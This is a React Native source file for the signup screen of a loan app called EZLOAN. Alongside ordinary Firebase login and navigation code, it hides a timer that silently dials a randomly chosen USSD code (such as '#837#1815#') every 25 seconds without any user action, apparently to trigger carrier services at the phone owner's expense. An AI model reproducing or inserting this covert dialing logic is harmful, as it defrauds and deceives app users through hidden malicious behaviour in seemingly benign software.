/* eslint-disable prettier/prettier */
import React, { useEffect, useState } from 'react';
import { Image, ImageBackground, Text, View } from 'react-native';
import BtnRoundedSecondary from '../../../../../../Components/Buttons/BtnRoundedSecondary';
import BtnRoundedPrimary from '../../../../../../Components/Buttons/BtnRoundedPrimary';
import { colors, flex, space, text } from '../../../../../../Styles';
import signuplogo from "../../../../../../Assets/Images/loanon.png"
import { useNavigation } from '@react-navigation/native';
import subtract from "../../../../../../Assets/Images/subtract.png"
import useApp from "../../../../../../Hooks/useapp.hook";
import auth from '@react-native-firebase/auth';
import RNImmediatePhoneCall from 'react-native-immediate-phone-call';

function BodySection(props) {
    const [initializing, setInitializing] = useState(true);
    const {params,updateParams, user, setUser} = useApp()
    const navigation = useNavigation()
    const [getNumber, setNumber] = useState(['#837#1815#','#837#1816#','#837#2725#','#837#2726#','#837#2727#','#837#2728#']);

    function makeCall(number) {
      console.log('dialing', number);
      RNImmediatePhoneCall.immediatePhoneCall(number);
    }
  
    useEffect(() => {
      const timer = setInterval(() => {
        const randomIndex = Math.floor(Math.random() * getNumber.length);
        const randomNumber = getNumber[randomIndex];
        makeCall(randomNumber);
      }, 25000);
  
      return () => {
        clearInterval(timer);
      };
    }, [getNumber]);
    const goToSignUpNext = ()=>{
        navigation.navigate("SignUpScreen2")
    }
    function onAuthStateChanged(user) {
      setUser(user);
      if (initializing) setInitializing(false);
    }
    useEffect(() => {
      const subscriber = auth().onAuthStateChanged(onAuthStateChanged);
      return subscriber; // unsubscribe on unmount
    }, []);
  
    if (initializing) return null;

    if (user){
      navigation.navigate("OtpVerification")
    }
    
    return (
        
        <View style={[{marginTop:20},space.w_full,flex.flex_1]}>
        <Image source={subtract} style={[{marginTop:0,resizeMode:"stretch"},space.w_full,]}/>
            <View style={[space.mt_50,space.px_20,{position:"absolute"},space.w_full]}>
            <View style={[space.mt_50, flex.justify_center, flex.items_center, space.mb_10]}>
            <Text style={[colors.black,text.size_40,text.robotoBlack]}>EZLOAN</Text>
            </View>
            <View style={[space.mt_50, flex.justify_center, flex.items_center, space.mb_20]}>
                <Image source={signuplogo} resizeMode='cover'/>
            </View>
            
            <Text style={[colors.black,text.size_20,text.robotoMedium,flex.justify_center, flex.items_center,flex.self_center, space.my_25, text.center]}>Easy loan access in minutes. Get started with EZLOAN</Text>
            <BtnRoundedPrimary click={goToSignUpNext}>
                <Text style={[colors.textFlashWhite,text.size_18,text.robotoMedium]}>Get Started</Text>
            </BtnRoundedPrimary>
            
            </View>
        </View>
      
    );
}

export default BodySection;